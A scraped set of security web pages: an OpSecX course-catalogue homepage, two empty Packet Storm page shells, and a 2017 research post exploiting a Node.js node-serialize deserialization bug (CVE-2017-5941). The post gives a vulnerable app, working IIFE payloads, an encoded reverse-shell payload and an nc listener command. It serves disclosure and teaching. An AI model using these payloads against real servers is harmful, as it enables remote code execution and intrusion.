=== Content from opsecx.com_199b7aa8_20250126_073444.html ===

### Support

* [Why OpSecX](https://opsecx.com/index.php/about-opsecx/)
* [Customer Support](/cdn-cgi/l/email-protection#7b18083b140b081e180355181416)

[![OpSecX](data:image/svg+xml...)](https://opsecx.com/ "Online Security Education Platform")
[Navigation](#navigation)
# [OpSecX](https://opsecx.com/)

## Online Security Education Platform

[Home](https://opsecx.com)
### Shopping Cart

* [$0.00 0 items](https://opsecx.com/index.php/my-cart/ "View your shopping cart")

### Main Menu

* Online Security Courses
  + [View All Courses](https://opsecx.com/index.php/all-courses/)
  + [Automated Mobile Application Security Assessment with MobSF](//opsecx.com/index.php/product/automated-mobile-application-security-assessment-with-mobsf/)
  + [Android Security Tools Expert](https://opsecx.com/index.php/product/android-security-tools-expert-atx/)
  + [XSSing JavaScript-MVC Applications](https://opsecx.com/index.php/product/xssing-javascript-mvc-applications-xja/)
  + [Cross Site Scripting (XSS) Attacks for Pentesters](//opsecx.com/index.php/product/cross-site-scripting-xss-attacks-for-pentesters/)
  + [Node.js Security: Pentesting and Exploitation](//opsecx.com/index.php/product/node-js-security-pentesting-and-exploitation/)
  + [WebSecNinja: Lesser Known WebAttacks](https://opsecx.com/index.php/product/websecninja-lesser-known-webattacks-wsn/)
  + [Windows Exploit Development Megaprimer](//opsecx.com/index.php/product/windows-exploit-development-megaprimer/)
  + [Mobile Security Bundle](https://opsecx.com/index.php/product/mobile-security-bundle/)
  + [Web Security Bundle](https://opsecx.com/index.php/product/web-security-bundle/)
* Services
  + [Application Security Services](https://opsecx.com/index.php/application-security-services/)
  + Live Training
    - [WebSecNinja 2.0 Live Edition](https://opsecx.com/index.php/websecninja-2-0-live-edition/)
    - [AndroSecNinja Live Edition](https://opsecx.com/index.php/androsecninja-live-edition/)
    - [Mobile Security Framework Live Edition](https://opsecx.com/index.php/mobile-security-framework-mobsf-live-course/)
    - [Pentesting modern day application technology stack](https://opsecx.com/index.php/pentesting-modern-day-application-technology-stack/)
* Resources
  + [Blog](https://opsecx.com/index.php/category/blog/)
  + [Security Books](https://opsecx.com/index.php/security-books/)
* My Account
  + [Log In](/index.php/my-profile/)

[Return to Content](#top)

## Learn Application Security Online!

Checkout our Application Security courses

[View Courses](//opsecx.com/index.php/all-courses/)

### WE TEACH PROFESSIONALS FROM

![OWASP](data:image/svg+xml... "OWASP")

![Microsoft](data:image/svg+xml... "Microsoft")

![IBM](data:image/svg+xml... "IBM")

![NCC Group](data:image/svg+xml... "NCC Group")

![Airtel](data:image/svg+xml... "Airtel")

![Vmware](data:image/svg+xml... "Vmware")

![Uber](data:image/svg+xml... "Uber")

![Honeywell](data:image/svg+xml... "Honeywell")

![KBZ Bank](data:image/svg+xml... "KBZ Bank")

![Accenture](data:image/svg+xml... "Accenture")

![Wes Bank](data:image/svg+xml... "Wes Bank")

![Wipro](data:image/svg+xml... "Wipro")

![EY](data:image/svg+xml... "EY")

## Featured Courses

[![Android Security Tools Expert - ATX](data:image/svg+xml...)](https://opsecx.com/index.php/course/android-security-tools-expert-atx/ "Android Security Tools Expert - ATX")
## [Android Security Tools Expert - ATX](https://opsecx.com/index.php/course/android-security-tools-expert-atx/ "Android Security Tools Expert - ATX")

by [Ajin Abraham](https://opsecx.com/index.php/author/ajin_abraham/ "Ajin Abraham")

30 Lessons
$49.99

This is a brand new course that covers the most commonly used android security assessment tools. Android Security assessment can be done with great ease if you have good expertise in the right tools. This course includes 12 different tools in over 30 videos. The course covers the features of tools like apktool, androguard, androbugs, dex2jar, baksmali, JD-GUI, drozer, qark, frida, xposed, appmon and mobsf. At the end of the course you will be proficient at using these tools in your day to day android application security assessments.

[![OpSecX WebSecNinja: Lesser Known WebAttacks](data:image/svg+xml...)](https://opsecx.com/index.php/course/websec_ninja-lesser-known-webattacks-wsn/ "WebSecNinja: Lesser Known WebAttacks - WSN")
## [WebSecNinja: Lesser Known WebAttacks - WSN](https://opsecx.com/index.php/course/websec_ninja-lesser-known-webattacks-wsn/ "WebSecNinja: Lesser Known WebAttacks - WSN")

by [Ajin Abraham](https://opsecx.com/index.php/author/ajin_abraham/ "Ajin Abraham")

23 Lessons
~~$59.00~~ Original price was: $59.00.$39.99Current price is: $39.99.

WebSecNinja: Lesser Known WebAttacks is a brand new and unique web security course that takes the learner to the next level of web security. A perfect blend of latest and lesser known web attacks that are explained with ultimate details and accompanied by demos and how tos that you can apply in real world red-team pentesting and security assessments. The course curriculum is designed to include web attacks and techniques that are not much documented in books, courses and elsewhere.

[![Automated Mobile Application Security Assessment with MobSF](data:image/svg+xml...)](https://opsecx.com/index.php/course/automated-mobile-application-security-assessment-with-mobsf/ "Automated Mobile Application Security Assessment - MAS")
## [Automated Mobile Application Security Assessment - MAS](https://opsecx.com/index.php/course/automated-mobile-application-security-assessment-with-mobsf/ "Automated Mobile Application Security Assessment - MAS")

by [Ajin Abraham](https://opsecx.com/index.php/author/ajin_abraham/ "Ajin Abraham")

26 Lessons
$34.99

Mobile Application market is growing like anything and so is the Mobile Security industry. With lots of frequent application releases and updates happening, conducting the security analysis of mobile applications becomes time consuming mainly because of the overheads in setting up and maintaining a mobile application testing environment. This course will introduce an extendable web framework called MobSF for Automated Security analysis of Mobile Applications.

Popular stories from our blog
# OpSecX Blog

* [More by OpSecX![](data:image/svg+xml...)](https://opsecx.com/index.php/author/ajinabraham/)
  ### [Exploiting Node.js deserialization bug for Remote Code Execution](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ "Exploiting Node.js deserialization bug for Remote Code Execution")

  February 8, 2017
* [More by OpSecX![](data:image/svg+xml...)](https://opsecx.com/index.php/author/ajinabraham/)
  ### [Server Side Template Injection in Tornado](https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/ "Server Side Template Injection in Tornado")

  July 3, 2016
* [More by OpSecX![](data:image/svg+xml...)](https://opsecx.com/index.php/author/ajinabraham/)
  ### [Launching OpSecX | Security Education for Everyone](https://opsecx.com/index.php/2016/01/02/launching-opsecx-security-education-for-everyone/ "Launching OpSecX | Security Education for Everyone")

  January 2, 2016

Copyright © 2024. All Rights Reserved.

[OpSecX.](//opsecx.com) | An OpenSecurity Initiative

[Privacy Policy](//opsecx.com/index.php/privacy-policy/) | [Terms and Conditions](//opsecx.com/index.php/terms-and-conditions/) | [Customer Support](/cdn-cgi/l/email-protection#0d6e7e4d627d7e686e75236e6260) | [Security](//opsecx.com/index.php/security/)



=== Content from packetstormsecurity.com_40570e8f_20250125_083436.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from packetstormsecurity.com_168f2d4c_20250125_083435.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from opsecx.com_afb20c33_20250125_083439.html ===

### Support

* [Why OpSecX](https://opsecx.com/index.php/about-opsecx/)
* [Customer Support](/cdn-cgi/l/email-protection#254656654a555640465d0b464a48)

[![OpSecX](data:image/svg+xml...)](https://opsecx.com/ "Online Security Education Platform")
[Navigation](#navigation)
# [OpSecX](https://opsecx.com/)

## Online Security Education Platform

[Home](https://opsecx.com)
### Shopping Cart

* [$0.00 0 items](https://opsecx.com/index.php/my-cart/ "View your shopping cart")

### Main Menu

* Online Security Courses
  + [View All Courses](https://opsecx.com/index.php/all-courses/)
  + [Automated Mobile Application Security Assessment with MobSF](//opsecx.com/index.php/product/automated-mobile-application-security-assessment-with-mobsf/)
  + [Android Security Tools Expert](https://opsecx.com/index.php/product/android-security-tools-expert-atx/)
  + [XSSing JavaScript-MVC Applications](https://opsecx.com/index.php/product/xssing-javascript-mvc-applications-xja/)
  + [Cross Site Scripting (XSS) Attacks for Pentesters](//opsecx.com/index.php/product/cross-site-scripting-xss-attacks-for-pentesters/)
  + [Node.js Security: Pentesting and Exploitation](//opsecx.com/index.php/product/node-js-security-pentesting-and-exploitation/)
  + [WebSecNinja: Lesser Known WebAttacks](https://opsecx.com/index.php/product/websecninja-lesser-known-webattacks-wsn/)
  + [Windows Exploit Development Megaprimer](//opsecx.com/index.php/product/windows-exploit-development-megaprimer/)
  + [Mobile Security Bundle](https://opsecx.com/index.php/product/mobile-security-bundle/)
  + [Web Security Bundle](https://opsecx.com/index.php/product/web-security-bundle/)
* Services
  + [Application Security Services](https://opsecx.com/index.php/application-security-services/)
  + Live Training
    - [WebSecNinja 2.0 Live Edition](https://opsecx.com/index.php/websecninja-2-0-live-edition/)
    - [AndroSecNinja Live Edition](https://opsecx.com/index.php/androsecninja-live-edition/)
    - [Mobile Security Framework Live Edition](https://opsecx.com/index.php/mobile-security-framework-mobsf-live-course/)
    - [Pentesting modern day application technology stack](https://opsecx.com/index.php/pentesting-modern-day-application-technology-stack/)
* Resources
  + [Blog](https://opsecx.com/index.php/category/blog/)
  + [Security Books](https://opsecx.com/index.php/security-books/)
* My Account
  + [Log In](/index.php/my-profile/)

[Return to Content](#top)

![](data:image/svg+xml...)
### OpSecX

[More by OpSecX](https://opsecx.com/index.php/author/ajinabraham/)

# Exploiting Node.js deserialization bug for Remote Code Execution

* [February 8, 2017](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ "Exploiting Node.js deserialization bug for Remote Code Execution")
* [Blog](https://opsecx.com/index.php/category/blog/)

### **tl;dr**

Untrusted data passed into `unserialize()` function  in node-serialize module can be exploited to achieve arbitrary code execution by passing a serialized JavaScript Object with an Immediately invoked function expression (IIFE).

### **The Bug**

During a Node.js code review, I happen to see a serialization/deserialization module named [node-serialize](https://www.npmjs.com/package/node-serialize). A cookie value that comes from the request was passed into the `unserialize()` function provided by the module. Here is a sample node.js application to imitate the code:

```

var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())

app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     res.send("Hello " + escape(obj.username));
   }
 } else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello World");
});
app.listen(3000);

```

Java, PHP, Ruby and Python have a fair share of Deserialization bugs. Some resources explaining these issues:

[Understanding PHP Object Injection](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)[Java Deserialization Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)[Rails Remote Code Execution Vulnerability Explained](http://blog.codeclimate.com/blog/2013/01/10/rails-remote-code-execution-vulnerability-explained/)[Arbitrary code execution with Python pickles](https://www.cs.uic.edu/~s/musings/pickle/)

However I couldn’t find any resource that explained deserialization/object injection bugs in Node.js. I thought to do some research on this and after spending some time I was able to exploit a deserialization bug to achieve arbitrary code injection.

### **Building the Payload**

I have used node-serialize version 0.0.4 for this research**.** For successful exploitation, arbitrary code execution should occur when untrusted input is passed into `unserialize()` function. The best way to create a payload is to use the `serialize()` function of the same module.

I created the following JavaScript object and passed it to `serialize()` function.

```

var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));

```

Which gives the following output.

![](data:image/svg+xml...)

Now we have a serialized string that can be deserialized with `unserialize()` function. But the problem is code execution won’t happen until you trigger the function corresponding to the `rce` property of the object.

Later I figured out that we can use JavaScript’s [Immediately invoked function expression (IIFE)](https://en.wikipedia.org/wiki/Immediately-invoked_function_expression) for calling the function. If we use IIFE bracket `()`after the function body, the function will get invoked when the object is created. It works similar to a Class constructor in C++.

Now the `serialize()` function with the modified object code is called.

```

var y = {
rce : function(){
require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
}(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));

```

The following output was obtained

![](data:image/svg+xml...)

The IIFE worked fine but the serialization failed. So I tried adding bracket `()` after the function body of the previously serialized string and passed it to `unserialize()` function and lucky it worked. So we have the exploit payload:

```
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',
function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```

Passing it to `unserialize()` function will result in code execution.

```

var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);

```

![](data:image/svg+xml...)

Now we know that we can exploit `unserialize()`function in node-serialize module, if untrusted data passed into it. Let’s exploit the vulnerability in the web application to spawn a reverse shell.

### **Further Exploitation**

The vulnerability in the web application is that it reads a cookie named profile from the HTTP request, perform base64 decode of the cookie value and pass it to `unserialize()`function. As cookie is an untrusted input, an attacker can craft malicious cookie value to exploit this vulnerability.

I used [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) for generating a reverse shell payload.

```
$ python nodejsshell.py 127.0.0.1 1337

[+] LHOST = 127.0.0.1

[+] LPORT = 1337

[+] Encoding

eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))

```

Now let’s generate the serialized payload and add IIFE brackets `()` after the function body.

```
{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}

```

We need to perform Base64 encode of the same, and then make a request to the web server with encoded payload in the Cookie header.

![](data:image/svg+xml...)

We can now listen for a shell

`nc -l 127.0.0.1 1337`

![](data:image/svg+xml...)

And now we have a reverse shell!

### **Exploitation Video**

### **Final Thoughts**

We exploited a deserialization bug to achieve arbitrary code execution with untrusted user input. The Rule of thumb is never to deserialize untrusted user input. The root cause is that it was using `eval()` internally for deserialization. I also found a similar bug in another module named [serialize-to-js](https://www.npmjs.com/package/serialize-to-js). In that module, the `require()` function in Node.js has no scope during deserialization of an object with IIFE and they were using `new Function()` internally for deserialization. We can still achieve code execution with a slightly complex payload.

### **Update**

Deserialization bug in node-serialize function is assigned [CVE-2017-5941](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941)

Deserialization bug in serialize-to-js function is assigned [CVE-2017-5954](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5954)

[deserialization in node.js](https://opsecx.com/index.php/tag/deserialization-in-node-js/)[node.js deserialization bug](https://opsecx.com/index.php/tag/node-js-deserialization-bug/)[object injection in node.js](https://opsecx.com/index.php/tag/object-injection-in-node-js/)[unserialize bugs in node.js](https://opsecx.com/index.php/tag/unserialize-bugs-in-node-js/)

[Server Side Template Injection in Tornado](https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/)
[Bypassing Hotstar Premium with DOM manipulation and some JavaScript](https://opsecx.com/index.php/2018/09/07/bypassing-hotstar-premium-with-dom-manipulation-and-some-javascript/)

Copyright © 2024. All Rights Reserved.

[OpSecX.](//opsecx.com) | An OpenSecurity Initiative

[Privacy Policy](//opsecx.com/index.php/privacy-policy/) | [Terms and Conditions](//opsecx.com/index.php/terms-and-conditions/) | [Customer Support](/cdn-cgi/l/email-protection#2744546748575442445f0944484a) | [Security](//opsecx.com/index.php/security/)


